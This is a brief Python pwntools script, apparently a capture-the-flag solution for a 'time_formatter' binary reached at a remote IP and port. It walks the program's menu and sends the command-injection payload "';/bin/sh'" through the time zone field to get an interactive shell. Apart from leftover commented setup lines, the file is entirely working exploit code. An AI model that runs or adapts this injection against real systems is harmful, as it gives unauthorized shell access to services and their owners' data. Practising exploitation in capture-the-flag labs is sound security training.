#coding:utf8
from pwn import *
from LibcSearcher import *
# import pwnlib
# io=process('./time_formatte')
io = remote('111.200.241.244',52002)
# def debug():
# 	pwnlib.gdb.attach(p)
# p=remote('pwn.buuoj.cn',20002)
# p=remote('111.200.241.244',59942)
context.log_level = 'debug'
# context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']
context(os='linux', arch='amd64', log_level='debug')
# context(os='linux',arch='amd64')
# sh = process('./ret2libc164')
# gdb.attach(p)
payload = "';/bin/sh'"
io.sendlineafter('>','1')
io.sendlineafter('Format:','aaaaaaaaa')
io.sendlineafter('>','5')
io.sendlineafter('(y/N)? ','N')
io.sendlineafter('>','3')
io.sendlineafter('Time zone:',payload)
io.sendlineafter('>','4')

io.interactive()




